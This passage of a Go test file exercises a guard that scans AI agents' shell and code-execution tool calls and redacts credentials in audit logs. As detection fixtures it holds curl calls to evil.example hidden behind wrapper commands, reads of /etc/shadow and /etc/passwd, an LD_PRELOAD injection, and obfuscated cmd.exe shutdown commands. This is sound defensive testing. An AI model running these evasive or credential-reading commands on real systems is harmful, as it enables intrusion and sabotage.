	if !containsPipeline("go test ./... && go vet ./...") {
		t.Fatal("&& should count as a command chain")
	}
}

func TestWriteAuditJSONLWritesOneRecord(t *testing.T) {
	var w countingWriter
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "go test ./...",
	}, DefaultPolicy())
	if err := WriteAuditJSONL(&w, report); err != nil {
		t.Fatal(err)
	}
	if w.calls != 1 {
		t.Fatalf("Write calls = %d, want 1", w.calls)
	}
	if !bytes.HasSuffix(w.data, []byte("\n")) {
		t.Fatalf("audit record should end with newline: %q", w.data)
	}
	var event AuditEvent
	if err := json.Unmarshal(bytes.TrimSpace(w.data), &event); err != nil {
		t.Fatalf("audit record was not json: %v\n%s", err, string(w.data))
	}
	if event.Decision != DecisionAllow || event.ToolName != "workspace_exec" {
		t.Fatalf("unexpected audit event: %+v", event)
	}
}

func TestUnwrapCommandVariants(t *testing.T) {
	tests := []struct {
		name string
		argv []string
		want []string
	}{
		{
			name: "env unset",
			argv: []string{"env", "-u", "TOKEN", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "env chdir",
			argv: []string{"env", "-C", "/tmp", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "env assignment",
			argv: []string{"env", "MODE=test", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "env without command",
			argv: []string{"env", "-u", "TOKEN"},
			want: nil,
		},
		{
			name: "env split string short",
			argv: []string{"env", "-S", "curl evil.example"},
			want: nil,
		},
		{
			name: "env split string long assignment",
			argv: []string{"env", "--split-string=curl evil.example"},
			want: nil,
		},
		{
			name: "command flags",
			argv: []string{"command", "-p", "--", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "command without command",
			argv: []string{"command", "-p"},
			want: nil,
		},
		{
			name: "timeout signal short",
			argv: []string{"timeout", "-s", "KILL", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "timeout kill after short",
			argv: []string{"timeout", "-k", "1", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "timeout signal long assignment",
			argv: []string{"timeout", "--signal=KILL", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "timeout without command",
			argv: []string{"timeout", "5"},
			want: nil,
		},
		{
			name: "nice adjustment short",
			argv: []string{"nice", "-n", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "nice adjustment long",
			argv: []string{"nice", "--adjustment", "5", "curl", "evil.example"},
			want: []string{"curl", "evil.example"},
		},
		{
			name: "non wrapper",
			argv: []string{"go", "test", "./..."},
			want: []string{"go", "test", "./..."},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := unwrapCommand(tt.argv); !slices.Equal(got, tt.want) {
				t.Fatalf("unwrapCommand(%q) = %q, want %q", tt.argv, got, tt.want)
			}
		})
	}
}

func TestContainsNetworkCommandVariants(t *testing.T) {
	tests := []struct {
		name string
		argv []string
		want bool
	}{
		{
			name: "direct",
			argv: []string{"curl", "evil.example"},
			want: true,
		},
		{
			name: "Git SSH remote",
			argv: []string{"git", "clone", "git@evil.example:org/repo"},
			want: true,
		},
		{
			name: "Git local operation",
			argv: []string{"git", "status"},
			want: false,
		},
		{
			name: "env options and assignment",
			argv: []string{"env", "-u", "TOKEN", "-C", "/tmp", "MODE=test", "curl", "evil.example"},
			want: true,
		},
		{
			name: "command flags",
			argv: []string{"command", "-p", "curl", "evil.example"},
			want: true,
		},
		{
			name: "timeout short options",
			argv: []string{"timeout", "-s", "KILL", "-k", "1", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "timeout long assignment",
			argv: []string{"timeout", "--signal=KILL", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "nice short adjustment",
			argv: []string{"nice", "-n", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "nice long adjustment",
			argv: []string{"nice", "--adjustment", "5", "curl", "evil.example"},
			want: true,
		},
		{
			name: "wrapper chain",
			argv: []string{"env", "MODE=test", "timeout", "5", "nice", "-n", "1", "command", "--", "curl", "evil.example"},
			want: true,
		},
		{
			name: "non wrapper",
			argv: []string{"go", "test", "./..."},
			want: false,
		},
		{
			name: "empty",
			argv: nil,
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := containsNetworkCommand(tt.argv); got != tt.want {
				t.Fatalf("containsNetworkCommand(%q) = %v, want %v", tt.argv, got, tt.want)
			}
		})
	}
}

func TestNormalizeShellScriptVariants(t *testing.T) {
	tests := []struct {
		name   string
		script string
		want   string
	}{
		{
			name:   "CRLF",
			script: "echo one\r\necho two",
			want:   "echo one ; echo two",
		},
		{
			name:   "escaped LF",
			script: "echo one\\\ntwo",
			want:   "echo onetwo",
		},
		{
			name:   "escaped CRLF",
			script: "echo one\\\r\ntwo",
			want:   "echo onetwo",
		},
		{
			name:   "newline in single quotes",
			script: "echo 'one\ntwo'",
			want:   "echo 'one two'",
		},
		{
			name:   "newline in double quotes",
			script: "echo \"one\ntwo\"",
			want:   "echo \"one two\"",
		},
		{
			name:   "blank line",
			script: "echo one\n\necho two",
			want:   "echo one ; echo two",
		},
		{
			name:   "leading blank lines",
			script: "\n\necho one",
			want:   "echo one",
		},
		{
			name:   "separator before newline",
			script: "echo one;\necho two",
			want:   "echo one;echo two",
		},
		{
			name:   "separator after newline",
			script: "echo one\n; echo two",
			want:   "echo one; echo two",
		},
		{
			name:   "pipe before newline",
			script: "echo one |\nwc -l",
			want:   "echo one |wc -l",
		},
		{
			name:   "trailing newline",
			script: "echo one\n",
			want:   "echo one",
		},
		{
			name:   "only newlines",
			script: "\r\n\n",
			want:   "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := normalizeShellScript(tt.script); got != tt.want {
				t.Fatalf("normalizeShellScript(%q) = %q, want %q", tt.script, got, tt.want)
			}
		})
	}
}

func TestPathCandidatesVariants(t *testing.T) {
	tests := []struct {
		name string
		arg  string
		want []string
	}{
		{name: "empty", arg: "   ", want: nil},
		{name: "ordinary", arg: " README.md ", want: []string{"README.md"}},
		{
			name: "option key value",
			arg:  `"--config=/etc/app"`,
			want: []string{"--config=/etc/app", "/etc/app"},
		},
		{name: "non option key value", arg: "MODE=test", want: []string{"MODE=test"}},
		{name: "empty option value", arg: "--config=", want: []string{"--config="}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := pathCandidates(tt.arg); !slices.Equal(got, tt.want) {
				t.Fatalf("pathCandidates(%q) = %q, want %q", tt.arg, got, tt.want)
			}
		})
	}
}

func TestHostOfVariants(t *testing.T) {
	tests := []struct {
		name string
		raw  string
		want string
	}{
		{name: "scheme less", raw: "evil.example/install.sh", want: "evil.example"},
		{name: "quoted scheme less", raw: `'LOCALHOST:8080/path'`, want: "localhost"},
		{name: "explicit scheme", raw: "https://API.GITHUB.COM/repos", want: "api.github.com"},
		{name: "bad URL", raw: "http://[::1", want: ""},
		{name: "empty", raw: "", want: ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := hostOf(tt.raw); got != tt.want {
				t.Fatalf("hostOf(%q) = %q, want %q", tt.raw, got, tt.want)
			}
		})
	}
}

type countingWriter struct {
	calls int
	data  []byte
}

type errorWriter struct{}

func (errorWriter) Write([]byte) (int, error) {
	return 0, errors.New("write failed")
}

func strconvQuote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func reportHasRule(report Report, ruleID string) bool {
	if report.RuleID == ruleID {
		return true
	}
	for _, finding := range report.Findings {
		if finding.RuleID == ruleID {
			return true
		}
	}
	return false
}

func (w *countingWriter) Write(p []byte) (int, error) {
	w.calls++
	w.data = append(w.data, p...)
	return len(p), nil
}

// TestPermissionPolicyScansToolSetPrefixedBuiltins proves that a built-in
// executor reached through a ToolSet keeps its scan. llmagent exposes ToolSet
// members through NewNamedToolSet, so the model-visible name carries the set
// prefix and the wrapper hides tool.ExecPermissionContextResolver.
func TestPermissionPolicyScansToolSetPrefixedBuiltins(t *testing.T) {
	for _, tc := range []struct {
		name       string
		setOptions []hostexec.Option
		execName   string
		stdinName  string
	}{
		{
			name:      "default tool set name",
			execName:  "hostexec_exec_command",
			stdinName: "hostexec_write_stdin",
		},
		{
			name:       "custom tool set name",
			setOptions: []hostexec.Option{hostexec.WithName("shell")},
			execName:   "shell_exec_command",
			stdinName:  "shell_write_stdin",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			opts := append(
				[]hostexec.Option{hostexec.WithBaseDir(t.TempDir())},
				tc.setOptions...,
			)
			set, err := hostexec.NewToolSet(opts...)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = set.Close() })

			ctx := context.Background()
			named := make(map[string]tool.Tool)
			for _, tl := range itool.NewNamedToolSet(set).Tools(ctx) {
				named[tl.Declaration().Name] = tl
			}
			for _, want := range []string{tc.execName, tc.stdinName} {
				if named[want] == nil {
					t.Fatalf("tool %q not exposed, got %v", want, named)
				}
			}

			policy := NewPermissionPolicy(DefaultPolicy())
			for _, call := range []struct {
				toolName string
				args     string
				want     tool.PermissionAction
			}{
				{tc.execName, `{"command":"sudo id"}`, tool.PermissionActionDeny},
				{tc.stdinName, `{"chars":"cat /etc/shadow\n","submit":true}`, tool.PermissionActionAsk},
			} {
				tl := named[call.toolName]
				decision, err := policy.CheckToolPermission(ctx, &tool.PermissionRequest{
					Tool:        tl,
					ToolName:    call.toolName,
					Declaration: tl.Declaration(),
					Arguments:   []byte(call.args),
				})
				if err != nil {
					t.Fatal(err)
				}
				if decision.Action != call.want {
					t.Fatalf("%s action = %q, want %q", call.toolName, decision.Action, call.want)
				}
			}
		})
	}
}

// TestPermissionPolicyScansWorkspaceExecInitialStdin proves that a payload
// carried only in stdin is scanned. workspace_exec forwards the field verbatim
// to the interpreter, so it never appears in the command.
func TestPermissionPolicyScansWorkspaceExecInitialStdin(t *testing.T) {
	policy := NewPermissionPolicy(DefaultPolicy())
	for _, tc := range []struct {
		name string
		args string
		want tool.PermissionAction
	}{
		{
			name: "denied path in stdin",
			args: `{"command":"python","stdin":"print(open('/etc/passwd').read())"}`,
			want: tool.PermissionActionDeny,
		},
		{
			name: "non allowlisted host in stdin",
			args: `{"command":"python","stdin":"import socket\nsocket.create_connection(('evil.example', 443))"}`,
			want: tool.PermissionActionDeny,
		},
		{
			name: "benign stdin still needs review",
			args: `{"command":"python","stdin":"print(1)"}`,
			want: tool.PermissionActionAsk,
		},
		{
			name: "absent stdin keeps the command decision",
			args: `{"command":"go test ./..."}`,
			want: tool.PermissionActionAllow,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			decision, err := policy.CheckToolPermission(
				context.Background(),
				&tool.PermissionRequest{
					ToolName:  "workspace_exec",
					Arguments: []byte(tc.args),
				},
			)
			if err != nil {
				t.Fatal(err)
			}
			if decision.Action != tc.want {
				t.Fatalf("action = %q, want %q (%s)", decision.Action, tc.want, decision.Reason)
			}
		})
	}
}

// TestPermissionPolicyIgnoresStdinForHostExec keeps the adapter aligned with
// each executor: exec_command has no stdin argument and drops the field, so
// scanning it would block a request the executor never acts on.
func TestPermissionPolicyIgnoresStdinForHostExec(t *testing.T) {
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName:  "exec_command",
		Arguments: []byte(`{"command":"echo hi","stdin":"print(open('/etc/passwd').read())"}`),
	})
	if err != nil || !ok {
		t.Fatalf("ok = %v, err = %v", ok, err)
	}
	if req.Stdin != "" {
		t.Fatalf("hostexec request captured stdin = %q, want empty", req.Stdin)
	}
}

// TestScanExecutionResolvingEnvOverrides proves that a safe command paired with
// hostile execution-resolving variables never returns allow. Both execution
// paths hand request environment values to a shell, and workspace_exec only
// enables clean-environment hardening when its separate command policy is set,
// so allowlisting these variables by name is not sufficient.
func TestScanExecutionResolvingEnvOverrides(t *testing.T) {
	for _, tc := range []struct {
		name string
		env  map[string]string
		want Decision
	}{
		{
			name: "hostile HOME and PATH",
			env:  map[string]string{"HOME": ".", "PATH": "."},
			want: DecisionDeny,
		},
		{
			name: "relative PATH entry among absolute ones",
			env:  map[string]string{"PATH": "/usr/bin:./bin"},
			want: DecisionDeny,
		},
		{
			name: "empty HOME falls back to shell defaults",
			env:  map[string]string{"HOME": ""},
			want: DecisionDeny,
		},
		{
			name: "loader injection",
			env:  map[string]string{"LD_PRELOAD": "/tmp/evil.so"},
			want: DecisionNeedsHumanReview,
		},
		{
			name: "absolute PATH still needs review",
			env:  map[string]string{"PATH": "/usr/bin:/bin"},
			want: DecisionNeedsHumanReview,
		},
		{
			name: "windows absolute PATH still needs review",
			env:  map[string]string{"PATH": `C:\Windows\System32;C:\tools`},
			want: DecisionNeedsHumanReview,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  "echo hi",
				Env:      tc.env,
			}, DefaultPolicy())
			if report.Decision != tc.want {
				t.Fatalf("decision = %q, want %q: %+v", report.Decision, tc.want, report)
			}
			if report.RuleID != "environment.execution_resolution_override" {
				t.Fatalf("rule = %q, want environment.execution_resolution_override", report.RuleID)
			}
		})
	}

	// A variable that does not resolve executables keeps the command decision.
	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "echo hi",
		Env:      map[string]string{"LANG": "C"},
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("LANG override decision = %q, want allow: %+v", report.Decision, report)
	}
}

// TestScanRedactsAuthorizationCredentials proves that a bearer or basic
// credential never survives into any exposed report field.
func TestScanRedactsAuthorizationCredentials(t *testing.T) {
	for _, tc := range []struct {
		name    string
		command string
		secret  string
	}{
		{
			name:    "bearer header",
			command: `curl -H 'Authorization: Bearer abc123opaque' https://api.github.com`,
			secret:  "abc123opaque",
		},
		{
			name:    "basic header",
			command: `curl -H "Authorization: Basic dXNlcjpwYXNz" https://api.github.com`,
			secret:  "dXNlcjpwYXNz",
		},
		{
			name:    "proxy authorization header",
			command: `curl -H 'Proxy-Authorization: Bearer proxysecret' https://api.github.com`,
			secret:  "proxysecret",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tc.command,
			}, DefaultPolicy())
			if report.Decision == DecisionAllow || !report.Redacted {
				t.Fatalf("credential command should not be allowed unredacted: %+v", report)
			}
			if strings.Contains(report.Command, tc.secret) ||
				strings.Contains(report.SafeSummary, tc.secret) {
				t.Fatalf("report retained the credential: %+v", report)
			}
			raw, err := json.Marshal(report)
			if err != nil {
				t.Fatal(err)
			}
			if bytes.Contains(raw, []byte(tc.secret)) {
				t.Fatalf("serialized report leaked the credential: %s", raw)
			}
			var event bytes.Buffer
			if err := WriteAuditJSONL(&event, report); err != nil {
				t.Fatal(err)
			}
			if bytes.Contains(event.Bytes(), []byte(tc.secret)) {
				t.Fatalf("audit event leaked the credential: %s", event.String())
			}
		})
	}
}

func TestScanRedactsURLAndCurlUserCredentials(t *testing.T) {
	for _, tc := range []struct {
		name    string
		command string
		secret  string
	}{
		{
			name:    "URL userinfo",
			command: `curl https://alice:hunter2@api.github.com`,
			secret:  "hunter2",
		},
		{
			name:    "short user option",
			command: `curl -u alice:hunter2 https://api.github.com`,
			secret:  "hunter2",
		},
		{
			name:    "quoted short user option",
			command: `curl -u 'alice:hunter two' https://api.github.com`,
			secret:  "hunter two",
		},
		{
			name:    "long user option",
			command: `curl --user=alice:hunter2 https://api.github.com`,
			secret:  "hunter2",
		},
		{
			name:    "password containing colon",
			command: `curl --user alice:hunter:two https://api.github.com`,
			secret:  "hunter:two",
		},
		{
			name:    "quoted proxy user option",
			command: `curl --proxy-user "alice:hunter two" https://api.github.com`,
			secret:  "hunter two",
		},
		{
			name:    "short option after quoted URL metacharacter",
			command: `curl 'https://api.github.com?a=1&b=2' -u alice:hunter2`,
			secret:  "hunter2",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspaceExec,
				Command:  tc.command,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny || !report.Redacted ||
				!reportHasRule(report, "sensitive.secret_leak") {
				t.Fatalf("credential command was not denied and redacted: %+v", report)
			}
			raw, err := json.Marshal(report)
			if err != nil {
				t.Fatal(err)
			}
			if bytes.Contains(raw, []byte(tc.secret)) {
				t.Fatalf("serialized report leaked the credential: %s", raw)
			}
			var event bytes.Buffer
			if err := WriteAuditJSONL(&event, report); err != nil {
				t.Fatal(err)
			}
			if bytes.Contains(event.Bytes(), []byte(tc.secret)) {
				t.Fatalf("audit event leaked the credential: %s", event.String())
			}
		})
	}

	report := Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "docker run -u 1000:1000 image",
	}, DefaultPolicy())
	if report.Decision != DecisionAllow || report.Redacted {
		t.Fatalf("unrelated -u value was treated as a credential: %+v", report)
	}

	report = Scan(Request{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspaceExec,
		Command:  "curl -u alice:first -u bob:second https://api.github.com",
	}, DefaultPolicy())
	raw, err := json.Marshal(report)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(raw, []byte("first")) || bytes.Contains(raw, []byte("second")) {
		t.Fatalf("serialized report leaked one of multiple credentials: %s", raw)
	}
}

// TestToolMetadataReusesFrameworkContract locks the guard onto the framework
// metadata contract. A field added to tool.ToolMetadata must reach a scan
// without updating a parallel type here.
func TestToolMetadataReusesFrameworkContract(t *testing.T) {
	meta := tool.ToolMetadata{
		ReadOnly:        true,
		Destructive:     true,
		ConcurrencySafe: true,
		SearchOrRead:    true,
		OpenWorld:       true,
		MaxResultSize:   4096,
	}
	// The alias makes assignment in both directions a compile-time guarantee.
	var guardMeta ToolMetadata = meta
	if tool.ToolMetadata(guardMeta) != meta {
		t.Fatalf("guard metadata = %+v, want %+v", guardMeta, meta)
	}
	req, ok, err := RequestFromPermissionRequest(&tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
		Metadata:  meta,
	})
	if err != nil || !ok {
		t.Fatalf("ok = %v, err = %v", ok, err)
	}
	if req.Metadata != meta {
		t.Fatalf("request metadata = %+v, want %+v", req.Metadata, meta)
	}
}

func TestCodeBlockReusesCodeexecutorContract(t *testing.T) {
	want := codeexecutor.CodeBlock{Language: "python", Code: "print(1)"}
	var got CodeBlock = want
	if got != want {
		t.Fatalf("guard code block = %+v, want %+v", got, want)
	}
}

// TestAppendAuditFilePropagatesCloseError proves that a delayed write failure
// surfaced only at close is reported, so a caller cannot treat an uncommitted
// event as audited.
func TestAppendAuditFilePropagatesCloseError(t *testing.T) {
	original := openAuditFile
	t.Cleanup(func() { openAuditFile = original })

	closeErr := errors.New("close failed")
	sink := &failingCloser{}
	openAuditFile = func(string) (io.WriteCloser, error) {
		return sink, nil
	}

	sink.closeErr = closeErr
	if err := AppendAuditFile("audit.jsonl", Report{
		Decision: DecisionAllow, RuleID: "ok", RiskLevel: RiskLow,
	}); !errors.Is(err, closeErr) {
		t.Fatalf("AppendAuditFile close error = %v, want %v", err, closeErr)
	}
	if !sink.closed {
		t.Fatal("audit file was not closed")
	}

	// A write failure keeps precedence, and the file is still closed.
	sink2 := &failingCloser{writeErr: errors.New("write failed"), closeErr: closeErr}
	openAuditFile = func(string) (io.WriteCloser, error) { return sink2, nil }
	err := AppendAuditFile("audit.jsonl", Report{
		Decision: DecisionAllow, RuleID: "ok", RiskLevel: RiskLow,
	})
	if !errors.Is(err, sink2.writeErr) {
		t.Fatalf("AppendAuditFile write error = %v, want %v", err, sink2.writeErr)
	}
	if !sink2.closed {
		t.Fatal("audit file was not closed after a write failure")
	}

	// The permission path must refuse to allow an execution it could not audit.
	openAuditFile = func(string) (io.WriteCloser, error) { return &failingCloser{closeErr: closeErr}, nil }
	policy := NewPermissionPolicy(DefaultPolicy(), WithAuditPath("audit.jsonl"))
	decision, err := policy.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./..."}`),
	})
	if err == nil {
		t.Fatal("CheckToolPermission audit close error = nil")
	}
	if decision.Action != tool.PermissionActionDeny {
		t.Fatalf("audit close error action = %q, want deny", decision.Action)
	}
}

type failingCloser struct {
	writeErr error
	closeErr error
	closed   bool
}

type permissionCodeExecutor struct {
	timeout time.Duration
	bounded bool
}

func (e *permissionCodeExecutor) ExecuteCode(
	_ context.Context,
	_ codeexecutor.CodeExecutionInput,
) (codeexecutor.CodeExecutionResult, error) {
	return codeexecutor.CodeExecutionResult{}, nil
}

func (e *permissionCodeExecutor) CodeBlockDelimiter() codeexecutor.CodeBlockDelimiter {
	return codeexecutor.CodeBlockDelimiter{}
}

func (e *permissionCodeExecutor) CodeExecutionTimeout() (time.Duration, bool) {
	return e.timeout, e.bounded
}

func (f *failingCloser) Write(p []byte) (int, error) {
	if f.writeErr != nil {
		return 0, f.writeErr
	}
	return len(p), nil
}

func (f *failingCloser) Close() error {
	f.closed = true
	return f.closeErr
}

// TestScanFailsClosedOnWindowsCmdExpansion proves that every cmd.exe expansion
// form is blocked. cmd.exe rewrites the token before execution, so a modifier
// can resolve to an executable the scan never sees.
func TestScanFailsClosedOnWindowsCmdExpansion(t *testing.T) {
	for _, tc := range []struct {
		name    string
		command string
	}{
		{"plain variable", `%COMSPEC% /c shutdown /s /t 0`},
		{"substitution modifier", `%COMSPEC:cmd.exe=shutdown.exe% /s /t 0`},
		{"substitution with wildcard", `%COMSPEC:*\=shutdown.exe% /s /t 0`},
		{"substring modifier", `%COMSPEC:~0,3% /c shutdown /s /t 0`},
		{"negative substring modifier", `%PATH:~-4% /c shutdown`},
		{"caret escape", `sh^utdown /s /t 0`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			report := Scan(Request{
				ToolName:       "exec_command",
				Backend:        BackendHostExec,
				Command:        tc.command,
				TimeoutSeconds: 10,
			}, DefaultPolicy())
			if report.Decision != DecisionDeny {
				t.Fatalf("decision = %q, want deny: %+v", report.Decision, report)
			}
		})
	}

	// A workspace command is parsed by the POSIX grammar and is unaffected.
	report := Scan(Request{
		ToolName:       "workspace_exec",
		Backend:        BackendWorkspaceExec,
		Command:        "go test ./...",
		TimeoutSeconds: 10,
	}, DefaultPolicy())
	if report.Decision != DecisionAllow {
		t.Fatalf("workspace decision = %q, want allow: %+v", report.Decision, report)
	}
}
